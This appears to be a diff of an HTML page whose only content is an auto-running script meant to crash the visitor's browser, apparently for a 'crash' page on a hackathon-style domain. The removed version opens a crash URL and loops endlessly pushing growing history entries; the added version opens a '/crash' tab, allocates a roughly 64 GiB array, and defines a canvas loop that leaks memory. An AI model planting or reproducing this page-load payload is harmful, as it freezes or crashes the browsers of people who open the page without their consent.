@@ -1,10 +1,20 @@
 <html>
     <head><script async>
-        window.open("https://game.hackthe131.xyz/crash", '_blank').focus();
-        var total = "";
-        for( var i = 0; i < 1000000000000000; i++ ) {
-        total += i.toString();
-        history.pushState(0,0, total );
+        Object.assign(document.createElement('a'), { target: '_blank', href: '/crash'}).click();
+        const x = new Uint8Array(4096 * 4096 * 4096 * 1).fill(255);
+        window.reallyFatCanvas = document.createElement('canvas');
+        let context = window.reallyFatCanvas.getContext('2d');
+
+        // References new context inside context, in loop.
+        function leakingLoop() {
+            context.canvas.width = document.body.clientWidth;
+            context.canvas.height = document.body.clientHeight;
+            const newContext = document.createElement('canvas').getContext('2d');
+            context.context = newContext;
+            context.drawImage(newContext.canvas, 0, 0);
+            
+            // The new context will reference another context on the next loop
+            context = newContext;
         }
     </script></head>
     <body></body>
